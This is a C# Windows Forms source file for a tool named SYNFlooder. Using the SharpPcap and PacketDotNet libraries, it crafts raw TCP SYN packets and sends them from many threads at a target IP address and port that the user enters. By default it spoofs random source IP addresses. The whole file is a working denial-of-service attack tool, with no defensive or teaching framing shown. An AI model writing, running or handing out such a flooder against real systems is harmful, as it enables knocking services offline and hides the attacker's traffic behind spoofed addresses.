using System;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketDotNet;
using SharpPcap;

namespace MyPacketCapturer
{
    public partial class SYNFlooder : Form
    {
        private static int randseed = 0;
        public static int instantiations = 0;
        CaptureDeviceList devices;  //List of devices for this computers
        public static ICaptureDevice device;  //the device we will be using
        byte[] localip = { 192, 168, 1, 43 };
        bool uselocalip = false;
        public SYNFlooder()
        {
            InitializeComponent();
            instantiations++;
            devices = CaptureDeviceList.Instance;
            //make sure that there is at least one device
            if (devices.Count < 1)
            {
                MessageBox.Show("no Capture Devices Found!");
                Application.Exit();
            }

            //add devices to the combo box
            foreach (ICaptureDevice dev in devices)
            {
                cmbNIC.Items.Add(dev.Description);
            }

            //get the third device and display in combo box
            device = devices[2];
            cmbNIC.Text = device.Description;


            int readTimeoutMilliseconds = 1000;
            device.Open(DeviceMode.Normal, readTimeoutMilliseconds);
        }

        private void SYNFlooder_FormClosed(object sender, FormClosedEventArgs e)
        {
            instantiations--;
        }

        private void Floodbtn_Click(object sender, EventArgs e)
        {
            getActualIP();
            uselocalip = option1.Checked;
            int threadcount = int.Parse(threadstxt.Text);
            List<Thread> threads = new List<Thread>();
            for (int p = 0; p < threadcount; p++)
            {
                var c = new Thread(synflood);
                threads.Add(c);
                c.Start();
            }
        }
        private void getActualIP()
        {
            foreach (NetworkInterface n in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation g = n.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (g != null)
                    if (n.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                    {
                        foreach (UnicastIPAddressInformation ip in n.GetIPProperties().UnicastAddresses)
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                localip = ip.Address.GetAddressBytes();
                    }
                        

            }
        }

        private void synflood()
        {
            Random rnd = new Random(randseed++);
            string ip1 = int.Parse(ip1txt.Text).ToString("x2");
            string ip2 = int.Parse(ip2txt.Text).ToString("x2");
            string ip3 = int.Parse(ip3txt.Text).ToString("x2");
            string ip4 = int.Parse(ip4txt.Text).ToString("x2");
            byte[] rndsrc = new byte[4];

            byte[] destip = { Convert.ToByte(ip1, 16), Convert.ToByte(ip2, 16), Convert.ToByte(ip3, 16), Convert.ToByte(ip4, 16) };
            string gmac1 = gmac1txt.Text;
            string gmac2 = gmac2txt.Text;
            string gmac3 = gmac3txt.Text;
            string gmac4 = gmac4txt.Text;
            string gmac5 = gmac5txt.Text;
            string gmac6 = gmac6txt.Text;
            byte[] actualmac = device.MacAddress.GetAddressBytes();
            byte[] randmac = new byte[6];
            byte[] destinationMac =  { Convert.ToByte(gmac1, 16), Convert.ToByte(gmac2, 16), Convert.ToByte(gmac3, 16),
                Convert.ToByte(gmac4, 16), Convert.ToByte(gmac5, 16), Convert.ToByte(gmac6, 16) };

            ushort DestinationPort = ushort.Parse(porttxt.Text);
            ushort SourcePort;
            if (!uselocalip)
            {
                for (int j = 0; j < int.Parse(NumOfPacketstxt.Text); j++)
                {

                    rnd.NextBytes(rndsrc);
                    rnd.NextBytes(randmac);

                    EthernetPacket ep = new EthernetPacket(new PhysicalAddress(actualmac), new PhysicalAddress(destinationMac), EthernetPacketType.IpV4);
                    System.Net.IPAddress dip = new System.Net.IPAddress(destip);
                    System.Net.IPAddress sip = new System.Net.IPAddress(rndsrc);
                    IPv4Packet p4 = new IPv4Packet(sip, dip);

                    SourcePort = (ushort)rnd.Next(0, 65535);

                    TcpPacket tp = new TcpPacket(SourcePort, DestinationPort);
                    tp.Syn = true;
                    tp.SequenceNumber = (uint)rnd.Next(1000, 9000);

                    tp.WindowSize = (ushort)64240;

                    p4.PayloadPacket = tp;
                    tp.UpdateTCPChecksum();
                    p4.UpdateIPChecksum();
                    ep.PayloadPacket = p4;

                    try
                    {
                        device.SendPacket(ep);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }

                }
            }

            else
            {
                for (int j = 0; j < int.Parse(NumOfPacketstxt.Text); j++)
                {
                    rnd.NextBytes(randmac);

                    EthernetPacket ep = new EthernetPacket(new PhysicalAddress(actualmac), new PhysicalAddress(destinationMac), EthernetPacketType.IpV4);
                    System.Net.IPAddress dip = new System.Net.IPAddress(destip);
                    System.Net.IPAddress sip = new System.Net.IPAddress(localip);
                    IPv4Packet p4 = new IPv4Packet(sip, dip);

                    SourcePort = (ushort)rnd.Next(0, 65535);

                    TcpPacket tp = new TcpPacket(SourcePort, DestinationPort);
                    tp.Syn = true;
                    tp.SequenceNumber = (uint)rnd.Next(1000, 9000);

                    tp.WindowSize = (ushort)64240;

                    p4.PayloadPacket = tp;
                    tp.UpdateTCPChecksum();
                    p4.UpdateIPChecksum();
                    ep.PayloadPacket = p4;

                    try
                    {
                        device.SendPacket(ep);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }

                }
            }
            

        }

        private void cmbNIC_SelectedIndexChanged(object sender, EventArgs e)
        {
            device = devices[cmbNIC.SelectedIndex];
            cmbNIC.Text = device.Description;

            int readTimeoutMilliseconds = 1000;
            device.Open(DeviceMode.Normal, readTimeoutMilliseconds);
        }
    }
}
